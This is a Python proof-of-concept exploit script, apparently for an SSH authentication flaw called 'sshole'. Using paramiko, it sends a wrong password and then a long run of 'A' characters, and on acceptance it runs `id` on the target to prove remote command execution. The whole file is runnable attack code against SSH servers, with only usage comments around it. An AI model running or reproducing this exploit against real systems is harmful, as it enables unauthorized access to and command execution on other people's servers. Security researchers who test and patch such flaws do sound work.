#!/usr/bin/env python3
# *sshole PoC in paramiko (matches github.com/oz9un/sshole/poc/attack.py).
# usage: attack.py HOST PORT USER [LEN]
# one connection, two attempts: "wrong", then "A" * LEN (default 300).
# prints `id` on success.
import socket, sys, paramiko

host, port, user = sys.argv[1], int(sys.argv[2]), sys.argv[3]
n = int(sys.argv[4]) if len(sys.argv) > 4 else 300

t = paramiko.Transport(socket.create_connection((host, port)))
t.start_client(timeout=10)

for pw in ("wrong", "A" * n):
    try:
        t.auth_password(user, pw)
        print(f"password len={len(pw)}: ACCEPTED")
        c = t.open_session()
        c.exec_command("id")
        print("id ->", c.makefile().read().decode().strip())
        break
    except paramiko.AuthenticationException:
        print(f"password len={len(pw)}: rejected")

t.close()
